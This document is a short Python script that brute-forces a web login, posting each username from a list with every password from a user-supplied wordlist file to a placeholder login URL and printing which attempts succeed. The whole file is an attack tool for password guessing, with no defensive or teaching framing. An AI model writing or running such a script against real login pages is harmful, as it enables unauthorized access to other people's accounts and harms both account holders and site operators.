import requests

def login_to_website(username, password):
    url = "https://example.com/login"  # Replace with the actual login URL
    data = {
        'username': username,
        'password': password
    }

    response = requests.post(url, data=data)

    if response.status_code == 200:
        print(f"Login successful for {username} with password {password}")
    else:
        print(f"Login failed for {username} with password {password}. Status code: {response.status_code}")

# Replace 'usernames' with your actual list of usernames
usernames = ['user1', 'user2', 'user3']

# Prompt for the password list name
password_list_name = input("Enter the name of the password list: ")

# Read passwords from the specified password list file
with open(password_list_name, 'r') as password_file:
    passwords = [line.strip() for line in password_file]

# Check each password for the specified username
for username in usernames:
    for password in passwords:
        login_to_website(username, password)
